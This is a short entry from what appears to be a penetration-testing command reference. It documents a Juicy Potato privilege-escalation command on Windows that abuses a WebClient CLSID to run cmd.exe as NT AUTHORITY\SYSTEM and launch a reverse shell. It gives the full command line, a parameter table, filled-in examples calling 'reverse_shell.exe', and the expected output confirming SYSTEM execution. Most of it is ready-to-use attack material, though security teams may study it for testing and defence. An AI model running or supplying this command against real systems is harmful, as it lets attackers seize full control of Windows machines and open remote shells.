---
type: command
executor: cmd
data: >-
  JuicyPotato.exe -l 1337 -p $_PROCESS_PATH -t $_TOKEN_TYPE -c
  {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "$_ARGUMENTS"
tags:
  - privilege-escalation
  - reverse-shell
  - windows
platforms:
  - Windows
verified: true
validated: true
---

# juicy-potato-cmd-reverse-shell-clsid-f7fd3fd6

## Command

```cmd
JuicyPotato.exe -l 1337 -p $_PROCESS_PATH -t $_TOKEN_TYPE -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "$_ARGUMENTS"
```

## Description

Escalates privileges using CLSID {F7FD3FD6-...} (WebClient) to run cmd.exe, which executes a reverse shell under SYSTEM.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -l 1337 | Local port for impersonation | Yes |
| -p $_PROCESS_PATH | Path to cmd.exe (e.g., c:\Windows\System32\cmd.exe) | Yes |
| -t $_TOKEN_TYPE | Token type (* for default) | Yes |
| -c {F7FD3FD6-...} | CLSID for WebClient | Yes |
| -a "$_ARGUMENTS" | Arguments (e.g., "/c reverse_shell.exe") | Yes |

## Examples

### Basic Usage

```cmd
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c c:\users\User\reverse_shell.exe"
```

### Advanced Usage

For direct command execution:

```cmd
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} -a "/c whoami > output.txt"
```

## Expected Output

Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
...
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK

Confirms SYSTEM execution; check for spawned process or shell connection.

## Related

- [[procedures/Abusing-Golden-Privileges-with-Juicy-Potato]]
- [[tools/Juicy-Potato]]
